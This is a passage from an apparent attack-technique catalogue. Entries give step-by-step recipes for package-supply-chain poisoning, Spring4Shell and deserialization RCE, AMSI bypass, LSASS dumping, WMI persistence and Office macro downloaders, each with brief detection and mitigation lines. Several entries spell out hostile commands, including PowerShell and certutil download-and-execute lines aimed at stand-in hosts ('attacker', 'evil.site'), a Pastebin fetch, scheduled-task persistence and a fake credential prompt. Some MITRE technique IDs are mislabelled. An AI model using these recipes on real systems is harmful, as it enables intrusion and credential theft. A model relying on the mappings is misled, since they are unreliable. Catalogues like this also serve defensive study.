- **Attack Steps**: 1. The attacker identifies a low-maintenance package used deep in dependency trees (e.g., leftpad-lite).2. They either take control via expired maintainer email or submit a benign PR and later become a contributor.3. Once they publish a new version, it is pulled in transitively by many projects that use higher-level packages.4. Inside the update, they insert a malicious function triggered under specific conditions (e.g., specific env var set).5. Since the package is rarely reviewed directly, the payload hides for long periods.6. When triggered, it executes code like beaconing out secrets or modifying system files.7. The attacker reaches multiple targets indirectly.
- **Detection**: Analyze full dependency trees including transitive packages
- **Solution**: Use allowlists for transitive deps, monitor contributor changes
- **Tags**: #TransitiveAttack #ChainHijack #NPMHijack

## Copycat Fork of Abandoned Package

- **Attack Type**: Malicious Library
- **Target**: Open-source devs
- **Vulnerability**: Lack of verification for forks
- **MITRE**: T1566.002
- **Impact**: Code execution, data theft
- **Tools**: Git, npm
- **Scenario**: A legitimate abandoned project is cloned and republished with malicious code under the same name.
- **Attack Steps**: 1. The attacker forks an old but still-used GitHub repo (e.g., js-formater) that hasn’t been updated in years.2. They copy the code and publish it to npm using the same name with a typo or variation (e.g., js-formattar).3. The forked version includes all functions but adds subtle malicious code in utility files.4. Developers searching for the original might install the lookalike, especially if the README and codebase look legit.5. Upon installation, the payload executes and might establish reverse shells or data theft.6. Because the repo looks like a continuation, the trust gap is small.7. The attacker gains entry through neglected but recognizable packages.
- **Detection**: Verify authorship, check domain/maintainer history
- **Solution**: Prefer verified packages, validate forks
- **Tags**: #ForkAbuse #LookalikePackage #AbandonedCode

## Hijacking via Package Name Homoglyph

- **Attack Type**: Dependency Confusion
- **Target**: Developer tools
- **Vulnerability**: Unicode homoglyph abuse
- **MITRE**: T1036.008
- **Impact**: Credential theft, lateral movement
- **Tools**: npm, PyPI
- **Scenario**: Unicode tricks are used to create malicious packages that look like popular ones.
- **Attack Steps**: 1. Attacker registers a package like react-scriρt (note the Greek rho ρ instead of p).2. On screens or fast reviews, it looks identical to react-script.3. Developers accidentally install the fake due to typos or visual similarity.4. The malicious package includes scripts that steal SSH keys or browser data.5. Since the rest of the package behaves normally, compromise isn’t noticed quickly.6. Homoglyphs evade basic duplicate detection.7. The attacker compromises victims who misread or mistype the package name.
- **Detection**: Use homoglyph scanners, compare ASCII names
- **Solution**: Reject non-ASCII package names where possible
- **Tags**: #HomoglyphAttack #Typosquatting #VisualExploit

## Watering Hole in Public Dev Utilities

- **Attack Type**: Malicious Library
- **Target**: Developer community
- **Vulnerability**: Blind trust in community recommendations
- **MITRE**: T1566.001
- **Impact**: Widespread compromise through blogs
- **Tools**: npm, GitHub
- **Scenario**: A widely-used utility package is poisoned and re-published in forums or blog articles.
- **Attack Steps**: 1. Attacker forks a well-known dev utility repo and adds malicious code.2. They then write blog posts or answer StackOverflow questions recommending the forked version.3. Developers follow these links assuming it’s legit, and install it.4. The malicious code activates on install or first run.5. It can open backdoors, modify system binaries, or exfiltrate data silently.6. Because the package name appears in developer-help content, users trust it.7. The attacker exploits the popularity of help forums to distribute payloads.
- **Detection**: Cross-check packages recommended in forums/blogs
- **Solution**: Use official sources, verify package history
- **Tags**: #WateringHole #ForumExploit #FakeFork

## Time-Bomb Logic in Build Dependency

- **Attack Type**: Malicious Library
- **Target**: CI tools
- **Vulnerability**: Time-based execution delay
- **MITRE**: T1499
- **Impact**: Coordinated delayed attack
- **Tools**: npm
- **Scenario**: A package includes code that activates only after a specific date, delaying detection.
- **Attack Steps**: 1. The attacker creates a helper module used in build systems (e.g., build-styler), and publishes it with no malware initially.2. After some time, they update the module with a line of logic: if (Date.now() > X) executePayload().3. The payload does nothing harmful for weeks.4. After the set date, it silently executes actions like downloading a second-stage payload.5. By then, the package is adopted widely and no longer under scrutiny.6. The attacker gets access to many systems simultaneously when the payload triggers.7. Post-incident forensics show delayed activation via date logic.
- **Detection**: Static analysis for timed payloads
- **Solution**: Audit for date-based logic in packages
- **Tags**: #TimeBomb #DelayedPayload #BuildAbuse

## Install Script with Self-Destruct Cleanup

- **Attack Type**: Malicious Library
- **Target**: Build systems
- **Vulnerability**: Ephemeral execution logic
- **MITRE**: T1070.004
- **Impact**: Stealth compromise of build environments
- **Tools**: npm, yarn
- **Scenario**: A package includes an install script that removes traces after running, hiding its activity.
- **Attack Steps**: 1. Attacker publishes a helper library for JavaScript builds, such as color-enhancer-plus.2. It contains an install.js script that executes a payload and immediately deletes itself and related logs.3. The payload sends system info or creates backdoors.4. The script then removes any temp files, log files, and even modifies bash history if possible.5. The self-destruction ensures the attack leaves minimal traces, making detection hard.6. The package appears clean to scanners after the first install.7. Multiple targets are infected with low forensic visibility.
- **Detection**: Real-time file monitoring, integrity enforcement
- **Solution**: Disable script execution on install
- **Tags**: #SelfDestruct #InstallWipe #LogEvasion

## Spring4Shell – Remote Code Upload via DataBinder Exploit

- **Attack Type**: Java ClassLoader Abuse
- **Target**: Java Web Servers
- **Vulnerability**: CVE-2022-22965 in Spring Core
- **MITRE**: T1210 – Exploitation of RCE
- **Impact**: Webshell access, potential server-wide RCE
- **Tools**: Burp Suite, Netcat, OpenJDK, SpringShell.py
- **Scenario**: Exploits Spring Core's DataBinder to upload a reverse shell via class property injection on unpatched systems.
- **Attack Steps**: 1. Identify server with Spring Boot + Apache Tomcat running on Java 9–17 by checking HTTP headers or fingerprinting (X-Powered-By, Server).2. Use SpringShell.py to craft a POST request that abuses class.module.classLoader.resources.context.parent.pipeline.first.pattern to write a JSP webshell into /webapps/ROOT/.3. Set the filename, suffix, and directory location using other bound parameters.4. Send the payload to /spring/endpoint, causing the JSP shell to be written to disk.5. Browse to /shell.jsp or connect via Netcat for reverse shell.6. Gain remote code execution with web server privileges.
- **Detection**: File write monitoring, WAF signatures
- **Solution**: Upgrade Spring, disallow dangerous param binding
- **Tags**: #Spring4Shell #JavaInjection #SpringShell #MITRE_T1210

## BinaryFormatter RCE via ViewState Exploitation in .NET

- **Attack Type**: .NET ViewState Injection
- **Target**: ASP.NET Apps
- **Vulnerability**: Unsafe ViewState deserialization
- **MITRE**: T1131 – App Layer Protocol
- **Impact**: Remote code execution, server takeover
- **Tools**: ysoserial.net, Burp Suite, Fiddler
- **Scenario**: Exploits insecure ViewState deserialization using BinaryFormatter in .NET web apps lacking MAC validation.
- **Attack Steps**: 1. Discover a .NET web app with ViewState in POST data, especially if no MAC validation is set (ViewStateUserKey not defined).2. Use DotPeek to confirm BinaryFormatter usage in code.3. Generate payload with ysoserial.net using a gadget chain like TypeConfuseDelegate.4. Base64 encode the payload and insert into the __VIEWSTATE parameter.5. Send POST request to vulnerable endpoint.6. Code gets executed on server as deserialization happens during page load.7. Reverse shell is triggered if payload was crafted to do so.
- **Detection**: ViewState MAC enabled, anomaly request length
- **Solution**: Enforce MAC validation, avoid BinaryFormatter
- **Tags**: #NETRCE #ViewStateHack #BinaryFormatter #MITRE_T1131

## Jenkins RCE via Malicious Plugin Upload

- **Attack Type**: Jenkins Plugin Abuse
- **Target**: CI/CD Servers
- **Vulnerability**: Malicious plugin upload with RCE code
- **MITRE**: T1059 – Script Interpreter
- **Impact**: Full remote code execution via Jenkins
- **Tools**: Jenkins CLI, javac, Burp Suite, Netcat
- **Scenario**: Abuses Jenkins plugin system by uploading a malicious plugin as an authenticated user with upload rights.
- **Attack Steps**: 1. Obtain Jenkins user credentials (e.g., via leaked configs or phishing).2. Clone a basic Jenkins plugin from GitHub and modify its source to include malicious code (e.g., reverse shell in PluginImpl.java).3. Compile the plugin using Maven or javac, package it into a .hpi file.4. Login to Jenkins and navigate to Manage Jenkins → Upload Plugin.5. Upload the malicious plugin, which auto-executes its code on installation.6. Catch reverse shell via Netcat listener.7. Use this access for reconnaissance or lateral movement.
- **Detection**: Jenkins plugin audit logs
- **Solution**: Disable plugin upload, use plugin signing
- **Tags**: #JenkinsRCE #PluginExploit #MITRE_T1059

## VMware vCenter RCE via SSRF to File Write

- **Attack Type**: SSRF to File Write Exploit
- **Target**: vCenter Servers
- **Vulnerability**: SSRF + File write to shell
- **MITRE**: T1210 – Exploitation of RCE
- **Impact**: Root-level access to virtual infrastructure
- **Tools**: SSRFmap, Burp, Python, Netcat
- **Scenario**: Exploits SSRF in vCenter plugin to overwrite config and enable file write via internal endpoints.
- **Attack Steps**: 1. Identify vCenter version 6.7 or 7.x with vulnerable plugin via /ui.2. Use SSRF against internal services using crafted URL in POST body (e.g., POST to /ui/h5-vsan/rest/proxy/service/&target=https://127.0.0.1:7080/someConfig).3. SSRF allows arbitrary POSTs to internal APIs.4. Abuse this to modify config and write a JSP shell into vcwebapps/ROOT/.5. Access the shell via browser or curl and execute OS commands.6. Reverse shell gives root if vCenter runs as root (common default).7. Lateral movement to ESXi is possible using embedded creds.
- **Detection**: Internal traffic proxy logs, SSRF detection
- **Solution**: Patch vulnerable plugin, use network ACLs
- **Tags**: #vCenterRCE #SSRFExploit #MITRE_T1210

## Pickle RCE in Python API via JWT Deserialization

- **Attack Type**: Insecure JWT Deserialization
- **Target**: Python APIs
- **Vulnerability**: Deserialization via pickle in JWTs
- **MITRE**: T1131 – App Layer Protocol
- **Impact**: Full access to app backend or container shell
- **Tools**: Netcat, Flask, jwt-payload-generator
- **Scenario**: Python API deserializes JWTs using pickle instead of safe libraries, leading to remote code execution.
- **Attack Steps**: 1. Inspect API headers for Authorization: Bearer <JWT> tokens.2. Decode JWT to see payload format (base64 structure).3. If algorithm is none or custom alg, try sending modified token.4. Create pickle payload with os.system() reverse shell using Python’s pickle.dumps() and base64.b64encode().5. Replace JWT payload with this malicious base64.6. Send modified token in header — if app uses pickle.loads() to deserialize JWT, it executes malicious code.7. Reverse shell is triggered, giving attacker access.
- **Detection**: JWT tamper detection, unusual token lengths
- **Solution**: Use pyJWT, avoid pickle in JWT processing
- **Tags**: #JWTExploit #PythonRCE #PickleJWT #MITRE_T1131

## PowerShell Empire C2 via LNK Shortcut

- **Attack Type**: Shortcut-Based Initial Access
- **Target**: Workstations
- **Vulnerability**: Trust in LNK files and PS execution
- **MITRE**: T1204.002 – Malicious File
- **Impact**: Covert C2 access via user interaction
- **Tools**: Empire, PowerShell, Windows Shortcut Editor
- **Scenario**: Embeds Base64-encoded PowerShell launcher inside a .lnk shortcut file that executes Empire stager.
- **Attack Steps**: 1. Use Empire to generate a PowerShell one-liner that connects to C2.2. Encode it using Base64 (-enc) for stealth.3. Create a .lnk (Windows shortcut) file pointing to powershell.exe -enc <encoded_payload> using tools like Shortcut.exe or manually via right-click properties.4. Modify icon and metadata to make the shortcut appear benign (e.g., a PDF or Word icon).5. Deliver .lnk via phishing email or USB.6. When clicked, PowerShell silently executes in the background and connects to Empire.7. Full agent is staged in memory and begins communication.
- **Detection**: Script block logging, AMSI, shortcut file monitoring
- **Solution**: Block script execution via LNK, enforce attachment filters
- **Tags**: #EmpireLNK #EncodedPS #MITRE_T1204_002

## PowerShell WMI for Remote DLL Injection

- **Attack Type**: WMI + Reflective Injection
- **Target**: Windows Domain Hosts
- **Vulnerability**: WMI & DLL trust assumptions
- **MITRE**: T1047 – WMI Execution
- **Impact**: Lateral movement with stealthy shellcode injection
- **Tools**: PowerShell, SharpWMI, Mimikatz, Netcat
- **Scenario**: Uses PowerShell to invoke WMI on remote machine and inject shellcode via reflective DLL loading.
- **Attack Steps**: 1. From attacker host, enumerate WMI permissions using PowerView.2. Ensure target allows DCOM/WMI calls from attacker IP.3. Create payload DLL using tools like msfvenom or CobaltStrike.4. Use SharpWMI or PowerShell's Invoke-WmiMethod to trigger remote process creation (e.g., rundll32) and load malicious DLL.5. DLL is reflectively loaded in memory, avoiding disk writes.6. Reverse shell or C2 beacon is established.7. Use this foothold for lateral movement or domain recon.
- **Detection**: WMI event subscription, DCOM call tracking
- **Solution**: Restrict WMI access, monitor DLL-based process creation
- **Tags**: #WMIInjection #ReflectiveDLL #MITRE_T1047

## PowerShell Download via OneNote Embedded Link

- **Attack Type**: Social Engineering + In-Memory PS
- **Target**: End-User Devices
- **Vulnerability**: Script download from trusted MS formats
- **MITRE**: T1204 – User Execution
- **Impact**: In-memory malware execution via user interaction
- **Tools**: PowerShell, Web Server, OneNote
- **Scenario**: Hides malicious PowerShell downloader inside embedded link of an .one (OneNote) file for stealth.
- **Attack Steps**: 1. Host malicious PowerShell script on attacker-controlled HTTP server.2. Create a OneNote .one file with an embedded clickable text box or image.3. Set the hyperlink to launch: powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1')".4. Deliver OneNote file via phishing or cloud share.5. Victim clicks the embedded element, launching PowerShell silently.6. Payload executes in memory, avoiding disk writes.7. Establishes C2 beacon or runs recon commands.
- **Detection**: Block outbound PS to unknown domains, OneNote macro scanning
- **Solution**: Restrict scriptable content in documents
- **Tags**: #OneNoteExploit #InMemoryPS #MITRE_T1204

## PowerShell Persistence via WMI Event Subscription

- **Attack Type**: Event-Based Persistence
- **Target**: Windows Hosts
- **Vulnerability**: Lack of monitoring on WMI permanent objects
- **MITRE**: T1546.003 – WMI Event Subscription
- **Impact**: Stealthy and long-lasting persistence
- **Tools**: PowerShell, WMI Explorer, Netcat
- **Scenario**: Registers malicious PowerShell script that executes when a specific WMI event (like process start) occurs.
- **Attack Steps**: 1. Use PowerShell to define a new WMI permanent event consumer and filter.2. Example filter: triggers when notepad.exe launches.3. Consumer executes: powershell -enc <encoded_payload>.4. Link the filter and consumer using __FilterToConsumerBinding.5. Payload runs silently whenever trigger condition is met.6. Since it's embedded in WMI repository, antivirus misses it.7. Remove traces by deleting WMI objects later using Remove-WmiObject.
- **Detection**: WMI repository audits, process startup monitoring
- **Solution**: Monitor/filter WMI consumers, restrict event-based actions
- **Tags**: #WMIPersistence #PSWMI #MITRE_T1546_003

## PowerShell GPO Manipulation via Registry

- **Attack Type**: Registry-Level GPO Bypass
- **Target**: Domain-Joined PCs
- **Vulnerability**: Local policy registry override
- **MITRE**: T1112 – Modify Registry
- **Impact**: Bypasses script restrictions and policy enforcement
- **Tools**: PowerShell, reg.exe, GPO Report Viewer
- **Scenario**: Alters local registry to override Group Policy settings blocking PowerShell scripts.
- **Attack Steps**: 1. On a machine with limited permissions, elevate privileges via token theft or misconfigured ACLs.2. Use reg.exe to modify keys under HKLM\Software\Policies\Microsoft\Windows\PowerShell.3. Set EnableScripts to 1 and ExecutionPolicy to Bypass.4. Restart PowerShell or logoff-logon for registry changes to apply.5. Now run previously blocked scripts or C2 payloads.6. Restore registry to default post-exploitation to reduce footprint.7. Monitor for changes using GPO baselining tools.
- **Detection**: Registry change detection, GPO deviation reports
- **Solution**: Block local registry override, enforce via GPO hardening
- **Tags**: #PSRegistryBypass #GPOHack #MITRE_T1112

## PowerShell Reflective Injection via RunPE Technique

- **Attack Type**: In-Memory PE Injection via PS
- **Target**: Windows Workstations
- **Vulnerability**: Lack of child process memory inspection
- **MITRE**: T1055 – Process Injection
- **Impact**: Stealthy memory-resident malware, evasion of endpoint tools
- **Tools**: RunPE.ps1, PowerShell, Netcat
- **Scenario**: Uses PowerShell RunPE method to inject PE payload (like Mimikatz) into suspended process entirely in memory.
- **Attack Steps**: 1. Generate a PE payload (e.g., Mimikatz.exe or Meterpreter shell) and convert it to byte array using Invoke-PSImage or manual hex-to-byte script.2. Launch a benign process in suspended mode using Start-Process notepad -WindowStyle Hidden and suspend it via script.3. Use RunPE.ps1 to map the payload into the memory of suspended process.4. Resume process — now running attacker-controlled code.5. Payload never touches disk; bypasses antivirus and EDR tools.6. Monitor target for credentials, tokens, or send beacon to C2 server.
- **Detection**: Monitor memory allocations, parent-child process mismatch
- **Solution**: Disable scripting or enforce AppLocker on RunPE patterns
- **Tags**: #RunPEInjection #MemoryInjection #MITRE_T1055

## AMSI Bypass via Dynamic .NET Assembly Generation

- **Attack Type**: .NET Assembly Obfuscation
- **Target**: AV-Protected Hosts
- **Vulnerability**: AMSI dynamic evasion using reflection
- **MITRE**: T1562.001 – Defense Evasion
- **Impact**: Script-based payloads go undetected
- **Tools**: PowerShell, Add-Type, Custom Assembly Builder
- **Scenario**: Generates a custom .NET assembly at runtime in PowerShell that disables AMSI without triggering static scans.
- **Attack Steps**: 1. Open PowerShell and dynamically define a new .NET class using Add-Type.2. Inside the assembly, create a static constructor that sets AmsiUtils.amsiInitFailed = true using reflection.3. Compile and load the assembly entirely in memory.4. When class is invoked, AMSI initialization is forcefully failed.5. Load encoded or malicious scripts after AMSI is disabled.6. Allows further post-exploitation like Mimikatz loading or script downloads.7. Since the class is generated at runtime, static AV signatures are bypassed.
- **Detection**: Hook detection, behavior monitoring of Add-Type usage
- **Solution**: Block dynamic class creation, enforce constrained language mode
- **Tags**: #DynamicBypass #AMSIKill #PowerShellEvasion #MITRE_T1562_001

## Alternate Data Stream Script Execution via Explorer Abuse

- **Attack Type**: ADS Triggered by File Association
- **Target**: NTFS-Based Windows
- **Vulnerability**: Trust in file association behavior
- **MITRE**: T1564.004 – Hide via ADS
- **Impact**: User-triggered, stealthy payload via trusted file types
- **Tools**: PowerShell, ADS, Explorer.exe
- **Scenario**: Stores PowerShell loader in ADS and launches via Explorer-triggered file association abuse.
- **Attack Steps**: 1. Embed script inside ADS: echo (malicious code) > readme.txt:runme.ps1.2. Modify file association for .txt to run a wrapper PowerShell command that reads and executes ADS content.3. When user double-clicks the .txt file, the PowerShell script in ADS runs silently.4. Payload may spawn reverse shell or download further malware.5. Since the actual .txt is innocent-looking, defenders rarely inspect ADS.6. Execution is triggered via native file handling, bypassing AV if no script is dropped visibly.
- **Detection**: ADS scanning, changes in file associations
- **Solution**: Block alternate streams, monitor association changes
- **Tags**: #ADSAbuse #ExplorerHijack #MITRE_T1564_004

## LSASS Dump via PowerShell MiniDump API Call

- **Attack Type**: In-Memory Dump Using Win32 API
- **Target**: High-Privilege Hosts
- **Vulnerability**: No EDR monitoring of API-level PowerShell
- **MITRE**: T1003.001 – LSASS Dumping
- **Impact**: Full credential dump without using Mimikatz binaries
- **Tools**: PowerShell, DInvoke.ps1, Admin Access
- **Scenario**: Uses PowerShell to invoke native MiniDumpWriteDump API and extract LSASS contents without external tools.
- **Attack Steps**: 1. Import DInvoke.ps1 or manually define MiniDump-related structs and functions in PowerShell.2. Use OpenProcess on LSASS PID (typically lsass.exe) with required privileges.3. Call MiniDumpWriteDump using memory-only PowerShell execution to write to a temp file.4. Extract cleartext passwords or hashes using Mimikatz or other parsing tools.5. Clean up dump file and remove script traces.6. Entire operation runs from PowerShell without dropping executables or using known tools.
- **Detection**: Monitor LSASS memory access, API call auditing
- **Solution**: Enable LSASS protection, restrict local admin tools
- **Tags**: #PowerShellMiniDump #DInvoke #MITRE_T1003_001

## PowerShell Obfuscation via Unicode Homoglyph Injection

- **Attack Type**: Visual Obfuscation Using Unicode
- **Target**: End-User Devices
- **Vulnerability**: Signature-only AV unable to normalize
- **MITRE**: T1027 – Obfuscated Files/Scripts
- **Impact**: Obfuscated execution that bypasses static scans
- **Tools**: PowerShell, Unicode Map Tools
- **Scenario**: Obfuscates PowerShell payload using visually similar Unicode homoglyphs to bypass detection rules.
- **Attack Steps**: 1. Take standard malicious PowerShell one-liner (e.g., download cradle or AMSI bypass).2. Replace key letters (i, l, o, etc.) with visually identical Unicode homoglyphs from Cyrillic or Greek (e.g., Latin l → Cyrillic ӏ).3. Script visually looks the same to humans, but has different character codes.4. Send obfuscated command to endpoint or embed in macro.5. PowerShell engine runs it as valid script, but signature-based detection fails.6. Used often in phishing or macro payloads to trick both defenders and tools.
- **Detection**: Unicode normalization in script analysis
- **Solution**: Normalize characters, flag mixed-script commands
- **Tags**: #UnicodeObfuscation #PSHomoglyphs #MITRE_T1027

## Macro Dropping ADS Payload

- **Attack Type**: Alternate Data Stream (ADS) Abuse
- **Target**: Endpoints
- **Vulnerability**: ADS not monitored by traditional AV
- **MITRE**: T1564.004 – Hidden File Execution
- **Impact**: Payload is hidden in NTFS ADS, bypassing AV and filesystem scanners
- **Tools**: VBA, PowerShell, NTFS ADS
- **Scenario**: Macro writes and executes PowerShell payload inside an NTFS Alternate Data Stream.
- **Attack Steps**: 1. Attacker creates a Word document containing a malicious macro using the VBA editor (ALT+F11). 2. Within the macro, the code writes a PowerShell payload into an Alternate Data Stream (ADS) using: echo payload > C:\temp\file.txt:hidden.ps1 where hidden.ps1 is not a real file, but an ADS. 3. To execute it stealthily, the macro runs PowerShell like: powershell -ExecutionPolicy Bypass -Command Get-Content C:\temp\file.txt:hidden.ps1 | Invoke-Expression.4. This results in in-memory execution of the script without ever dropping a visible .ps1 file.5. Because ADS is often ignored by antivirus and EDR tools, it enables fileless persistence and evasion.
- **Detection**: Monitor ADS creation, PowerShell execution, and file access to ADS
- **Solution**: Block use of ADS by policy or via filesystem tools like Sysmon
- **Tags**: #ADS #FilelessMacro #NTFSBypass

## VBA Macro + CertUtil Downloader

- **Attack Type**: Trusted Binary Abuse
- **Target**: Corporate Endpoints
- **Vulnerability**: certutil allowed as trusted tool
- **MITRE**: T1218.010 – Signed Binary Execution
- **Impact**: Trusted binary used for malware delivery
- **Tools**: VBA, certutil.exe
- **Scenario**: Leverages signed Microsoft binary certutil.exe to download and execute a payload.
- **Attack Steps**: 1. The attacker embeds a macro into an Office document that executes certutil to download malware: Shell("certutil -urlcache -split -f http://evil.site/dropper.exe dropper.exe").2. This uses certutil.exe, a trusted Microsoft binary (LOLBAS), to fetch the remote payload and save it locally.3. The macro then runs the payload using Shell("dropper.exe"), triggering malware installation.4. Since certutil.exe is digitally signed and often allowed, this bypasses most antivirus heuristics.5. The macro may also delete itself or the payload post-execution to reduce forensic evidence.
- **Detection**: Detect certutil calls with suspicious URLs or file output
- **Solution**: Disable certutil for non-admin users or restrict network access
- **Tags**: #Certutil #DownloaderMacro #LivingOffTheLand

## Excel Macro via Hidden Cell Logic

- **Attack Type**: Logic-Based Execution
- **Target**: Spreadsheet Users
- **Vulnerability**: Hidden cell data not scanned
- **MITRE**: T1027 – Obfuscated Files or Info
- **Impact**: Obfuscated payload avoids static analysis
- **Tools**: Excel, VBA
- **Scenario**: Malicious formula logic hidden in invisible spreadsheet cells, triggered by macro.
- **Attack Steps**: 1. The attacker places base64-encoded PowerShell or shell commands in hidden cells (e.g., columns hidden via format settings).2. The macro reads the data using Range("A1").Value or similar, decodes it via a VBA routine like Base64Decode, and stores it into a string variable.3. It executes the decoded string using Shell or WScript.Shell.4. This bypasses simple static AV scans, since macros appear non-malicious at a glance and payload logic is stored in benign-looking sheet data.5. May also trigger on events like Workbook_Open or button clicks.
- **Detection**: Enable full content scan including hidden cells
- **Solution**: Enforce macro security + cell content auditing
- **Tags**: #HiddenLogic #MacroObfuscation #ExcelPayload

## Macro using WMI via PowerShell

- **Attack Type**: WMI for Stealth Execution
- **Target**: Windows Machines
- **Vulnerability**: WMI not linked to Office process tree
- **MITRE**: T1047 – WMI Execution
- **Impact**: Office parent process is hidden from detection logic
- **Tools**: VBA, WMI, PowerShell
- **Scenario**: Executes PowerShell payload using WMI from within macro, bypassing process linkage.
- **Attack Steps**: 1. The attacker adds macro code in Word that creates a WMI service object: Set objWMI = GetObject("winmgmts:root\cimv2").2. Then runs objWMI.Get("Win32_Process").Create("powershell -nop -w hidden -e <payload>") to spawn PowerShell indirectly.3. This creates a new PowerShell process via WMI, which will not show Word/Excel as a direct parent.4. The payload is usually base64 encoded and passed via -e flag to avoid AV inspection.5. Because WMI was used for execution, this evades parent-child detection chains used by EDRs.
- **Detection**: Enable WMI auditing, log all WMI commands and origin process
- **Solution**: Block macro usage of WMI APIs in endpoint controls
- **Tags**: #WMI #StealthExec #MacroEvadeAV

## Word Macro Trigger via ActiveX Controls

- **Attack Type**: ActiveX Shell Execution
- **Target**: Word Users
- **Vulnerability**: ActiveX objects allowed in Office
- **MITRE**: T1059.005 – Office Macros
- **Impact**: ActiveX grants macro full OS command execution
- **Tools**: VBA, ActiveX, WScript.Shell
- **Scenario**: Embeds ActiveX object to create shell and execute OS commands inside Word.
- **Attack Steps**: 1. The attacker writes macro code like: Set shell = CreateObject("WScript.Shell").2. Then calls: shell.Run "cmd.exe /c powershell -nop -w hidden -EncodedCommand ...", which executes a hidden PowerShell payload.3. ActiveX object WScript.Shell is a legitimate scripting interface built into Windows and often not blocked.4. If Office is configured to allow ActiveX, the code bypasses macro policy or trusted locations check.5. Can be triggered during Document_Open or other macro-enabled events.
- **Detection**: Detect ActiveX object usage and execution logs
- **Solution**: Restrict ActiveX in Office and disable scripting interfaces
- **Tags**: #ActiveX #ShellRun #MacroExecution

## Multi-Stage VBA Payload Delivery via Pastebin

- **Attack Type**: Multi-Stage Payload Delivery
- **Target**: Enterprise Users
- **Vulnerability**: Dynamic macro content bypasses scanners
- **MITRE**: T1027 – Obfuscated Delivery
- **Impact**: Payload not embedded in file; evades static and sandbox scanners
- **Tools**: VBA, Pastebin, PowerShell
- **Scenario**: Macro loads second-stage payload dynamically from Pastebin or GitHub to avoid static detection.
- **Attack Steps**: 1. The attacker embeds a lightweight macro in the Office document.2. Macro runs: IEX (New-Object Net.WebClient).DownloadString('https://pastebin.com/raw/xyz123'), which fetches and executes a PowerShell second-stage payload.3. The second-stage payload can be a shellcode injector, C2 beacon, or persistence dropper.4. No payload is statically embedded in the document, bypassing signature-based AV.5. Payload remains dynamic—can be updated on Pastebin anytime to deliver different threats.
- **Detection**: Monitor PowerShell network calls from Office processes
- **Solution**: Block Office access to pastebin/github-like services
- **Tags**: #MultiStage #PastebinPayload #DynamicMacro

## Macro Creating Scheduled Task for Persistence

- **Attack Type**: Task Scheduler Abuse
- **Target**: Windows Users
- **Vulnerability**: Task scheduler unrestricted from macros
- **MITRE**: T1053.005 – Scheduled Task
- **Impact**: Long-term persistence via system task scheduler
- **Tools**: VBA, schtasks.exe
- **Scenario**: VBA macro abuses Windows Task Scheduler to persistently execute a malware payload at set intervals.
- **Attack Steps**: 1. Macro runs: Shell("schtasks /Create /SC DAILY /TN updatetask /TR 'powershell -File C:\mal\payload.ps1' /F") to create a daily scheduled task.2. This launches the payload script under user/system context silently.3. Scheduled tasks are trusted mechanisms and bypass typical startup or registry-based persistence detection.4. Persistence survives reboots and avoids triggering traditional startup file monitors.5. Removal of macro or initial infection does not disable the task.
- **Detection**: Audit task creation; alert on Office-created tasks
- **Solution**: Restrict schtasks.exe access to admin roles
- **Tags**: #Persistence #ScheduledTask #MacroTrigger

## VBA Download and Execute via MSXML2.XMLHTTP

- **Attack Type**: Web Request-Based Downloader
- **Target**: Office Users
- **Vulnerability**: External web requests allowed in macros
- **MITRE**: T1105 – Remote File Copy
- **Impact**: Payload runs in memory with no disk trace
- **Tools**: VBA, MSXML2.XMLHTTP, PowerShell
- **Scenario**: Uses MSXML2.XMLHTTP in macro to download and execute payloads in memory without dropping files.
- **Attack Steps**: 1. Macro uses: Set req = CreateObject("MSXML2.XMLHTTP") to fetch a script from a malicious URL.2. Reads and stores the response with req.ResponseText.3. Executes the response using PowerShell’s Invoke-Expression with Shell call.4. Execution is fully in-memory and no file is ever written to disk.5. Leaves minimal forensic evidence, often bypasses AV that does not monitor script-in-memory behavior.
- **Detection**: Monitor Office child processes that make HTTP requests
- **Solution**: Block Office’s use of MSXML or restrict internet macro access
- **Tags**: #XMLHTTP #MemoryExecution #DownloaderMacro

## Macro-Based Credential Harvesting Prompt

- **Attack Type**: Fake Credential Prompt
- **Target**: Office Users
- **Vulnerability**: GUI trust and user confusion
- **MITRE**: T1056.004 – Credential Prompt
- **Impact**: Attacker collects valid user credentials for reuse
- **Tools**: VBA, InputBox, MSForms
- **Scenario**: Macro presents GUI prompt to trick users into entering login credentials, often posing as Windows alert.
- **Attack Steps**: 1. Macro runs: InputBox("Your session has expired. Please re-enter your email password.") to simulate a real system prompt.2. Captures user input and stores it in a hidden variable or writes it to disk.3. May exfiltrate credentials via HTTP POST, email, or save to a remote-accessible location.4. GUI resembles legitimate prompts from Windows or Office, deceiving the user.5. Can be embedded in login-themed documents like HR forms, finance sheets, or shared templates.
- **Detection**: Monitor macros invoking InputBox or form objects
- **Solution**: Block macros from using input prompts; user training
- **Tags**: #PhishingPrompt #CredentialHarvest #InputBox

## VBA Macro Triggering DLL via Rundll32

- **Attack Type**: DLL Execution via Rundll32
- **Target**: Enterprise Users
- **Vulnerability**: Trusted system binary used for execution
- **MITRE**: T1218.011 – Rundll32
- **Impact**: Malware loaded via legitimate DLL launcher
- **Tools**: VBA, DLL, rundll32.exe
- **Scenario**: Macro uses trusted Windows utility rundll32.exe to execute a malicious DLL payload silently.
- **Attack Steps**: 1. Macro writes or drops a malicious DLL to disk: payload.dll.2. Executes the DLL using: Shell("rundll32.exe payload.dll,EntryPoint").3. The DLL contains encoded shellcode, backdoor, or C2 communication setup.4. Since rundll32.exe is a trusted Windows binary, it evades application whitelisting and AV scrutiny.5. Process execution appears benign in logs, complicating detection.
- **Detection**: Monitor rundll32 for execution of non-system DLLs
- **Solution**: Restrict rundll32 usage to signed or whitelisted DLLs
- **Tags**: #Rundll32 #DLLExecution #MacroAbuse

## Macro with Obfuscated String Assembly

- **Attack Type**: String Obfuscation for AV Evasion
- **Target**: General Users
- **Vulnerability**: Obfuscated strings bypass static scanners
- **MITRE**: T1027 – Obfuscated Files/Scripts
- **Impact**: Evasion through runtime string building and encoding
- **Tools**: VBA, Base64, PowerShell
- **Scenario**: Obfuscates malicious strings via concatenation, base64, or XOR encoding to evade signature detection.
- **Attack Steps**: 1. Macro contains fragmented PowerShell script split across multiple variables: part1 = "po"; part2 = "wer"; part3 = "shell" etc.2. Reassembles script at runtime using: payload = part1 & part2 & part3....3. Optionally encodes payload using Base64: Shell("powershell -EncodedCommand " & payload).4. Uses dynamic string operations like reverse, hex or XOR to further obfuscate.5. AV engines miss the malicious intent due to lack of static string indicators.
- **Detection**: Use dynamic analysis and heuristic string pattern detection
- **Solution**: Block macro string assembly functions; enhance AV heuristics
